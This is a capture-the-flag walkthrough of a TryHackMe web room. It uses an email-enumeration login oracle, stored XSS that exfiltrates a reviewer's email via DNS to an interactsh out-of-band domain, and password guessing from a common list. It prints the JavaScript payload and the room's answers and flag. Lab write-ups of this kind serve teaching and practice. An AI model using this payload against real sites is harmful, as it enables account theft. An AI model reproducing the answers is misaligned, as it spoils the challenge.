# TryHackMe — That's The Ticket

**Platform**: TryHackMe  
**Room Name**: That's The Ticket  
**Target IP**: `10.49.161.193`  
**Category**: Web Exploitation / Stored XSS / OOB Exfiltration  
**Flag**: `THM{6804f45260135ec8418da2d906328473}`  

---

## 1. Scenario & Challenge Objectives

The challenge brief reads:
> *IT Support are going to have a bad day, can you get into the admin account?*  
> *IT Support is going to have a really bad day today, but don't think they're stupid! They have really strict firewalls!*  
> *Using the IT support portal try and make your way into the admin account.*  
> *Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!*

We are tasked with answering three specific questions:
1. **What is IT Support's email address?**
2. **Admin user's password**
3. **Flag inside Ticket 1**

---

## 2. Reconnaissance & Port Scanning

We began by scanning all open ports on the target host using Nmap:

```bash
nmap -sC -sV -p- --min-rate 1000 10.49.161.193
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

Only two ports are open:
- **Port 22**: OpenSSH 7.6p1
- **Port 80**: Nginx 1.14.0 hosting an application called "Ticket Manager"

---

## 3. Web Application Analysis

Navigating to the root page (`http://10.49.161.193/`) reveals a simple web portal:
> *"Ticket Manager allows AcmeCorp employees to log support tickets with IT support"*

The application offers self-registration at `/register` and authentication at `/login`.

### Authentication Oracle
Testing the login form revealed a significant information disclosure vulnerability:
- When an email does **not** exist in the database, the server returns:
  ```html
  <div class="alert alert-danger text-center">
      <p>We not not recognise that email</p>
  </div>
  ```
- When an email **does** exist in the database, but an incorrect password is provided, the server returns:
  ```html
  <div class="alert alert-danger text-center">
      <p>Invalid email / password combination</p>
  </div>
  ```

This allows us to verify whether any given email address exists in the system without lockout or rate limiting.

### Ticket Creation & Stored XSS
After registering a standard account, the user dashboard allows creating new support tickets via a `POST` request to `/`:
```html
<form method="post">
    <div><label>Message:</label></div>
    <div><textarea name="message" class="form-control" style="height: 200px;"></textarea></div>
    <div style="margin-top:15px"><input type="submit" class="btn btn-success pull-right" value="Create Ticket"></div>
</form>
```

When a ticket is created, the system renders the ticket view at `/<ticket_id>`:
```html
<div><textarea class="form-control" style="height: 200px">USER_INPUT</textarea></div>
```

The user input inside the `<textarea>` tag is not sanitized. By closing the tag with `</textarea>`, we achieve arbitrary HTML and JavaScript execution.

---

## 4. Bypassing the Firewall via DNS Exfiltration (Interactsh)

The prompt warned of strict outbound firewall rules on the target:
> *"They have really strict firewalls! Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!"*

Direct HTTP callbacks to our VPN listener failed because outbound HTTP traffic was blocked by the host's firewall. However, outbound recursive DNS queries were permitted.

Using `interactsh-client`, we established an Out-of-Band (OOB) listener session:
```bash
interactsh-client -v -o interactsh.log
```
Assigned OOB domain:
```
db9l5afn11f8iv90a2egg7irsi4he9o3f.oast.online
```

### Exfiltrating IT Support's Identity
We crafted a Stored XSS payload designed to read the logged-in user's email from the top navigation bar (`<span id="email">`) and issue a DNS query where the subdomain encoded the email string:

```html
</textarea>
<script>
  var em = (document.getElementById("email") ? document.getElementById("email").innerText : "unknown")
            .replace(/[^a-zA-Z0-9]/g, "x");
  var img = new Image();
  img.src = "http://em." + em + ".db9l5afn11f8iv90a2egg7irsi4he9o3f.oast.online/a";
</script>
```

When the simulated IT Support reviewer accessed our ticket, `interactsh` captured the incoming DNS request:
```
[em.adminaccountxitsupportxthm.db9l5afn11f8iv90a2egg7irsi4he9o3f] Received DNS interaction (A) from 13.233.177.47
```

Translating the sanitized `x` characters back to `@` and `.`:
```
adminaccount@itsupport.thm
```

Testing this email against `/login` confirmed its existence via the oracle:
```bash
curl -s http://10.49.161.193/login -d "email=adminaccount@itsupport.thm&password=wrongpassword"
```
**Response:** `Invalid email / password combination`

---

## 5. Recovering the Admin Password

With the admin email identified as `adminaccount@itsupport.thm` and no lockout policy enforced on `/login`, we tested the credentials against standard common password lists (`10k-most-common.txt` from SecLists):

```bash
curl -s -i http://10.49.161.193/login -d "email=adminaccount@itsupport.thm&password=123123"
```

**Response:**
```http
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Set-Cookie: token=e0481549348aeb4a9d3ed319d7f637c5; expires=Sun, 18-Oct-2026 11:05:59 GMT; Max-Age=86400; path=/; HttpOnly
Location: /
```

The password for `adminaccount@itsupport.thm` is:
```
123123
```

---

## 6. Retrieving the Flag from Ticket 1

With valid credentials for `adminaccount@itsupport.thm`, we authenticated and accessed the restricted Ticket 1 at `/1`:

```bash
curl -s -b "token=e0481549348aeb4a9d3ed319d7f637c5" http://10.49.161.193/1
```

**Ticket Content:**
```html
<div class="panel panel-default">
    <div class="panel-heading">Tickets ID: 1</div>
    <div class="panel-body">
        <div>From: <label>user@acmecorp.thm</label></div>
        <div><label>Message:</label></div>
        <div><textarea class="form-control" style="height: 200px">Hey, can you change my password to THM{6804f45260135ec8418da2d906328473}</textarea></div>
    </div>
</div>
```

---

## 7. Challenge Questions & Answers

| # | Question | Answer |
|---|---|---|
| 1 | What is IT Support's email address? | `adminaccount@itsupport.thm` |
| 2 | Admin user's password | `123123` |
| 3 | Flag inside Ticket 1 | `THM{6804f45260135ec8418da2d906328473}` |
